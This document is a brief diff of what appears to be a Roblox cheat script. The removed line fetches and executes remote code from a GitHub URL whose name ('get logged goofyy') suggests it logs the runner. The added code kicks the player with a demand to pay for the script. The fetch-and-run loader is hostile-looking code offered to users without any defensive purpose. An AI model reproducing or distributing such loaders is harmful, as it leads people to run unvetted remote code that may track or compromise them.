@@ -1,1 +1,4 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Jstalkskibiditoiletuserhie201982/idek/refs/heads/main/get%20logged%20goofyy"))()
+local Players = game:GetService("Players")
+local localPlayer = Players.LocalPlayer
+
+localPlayer:Kick("The script is now paid again,BUY IT IF U WANNA TAP😈")
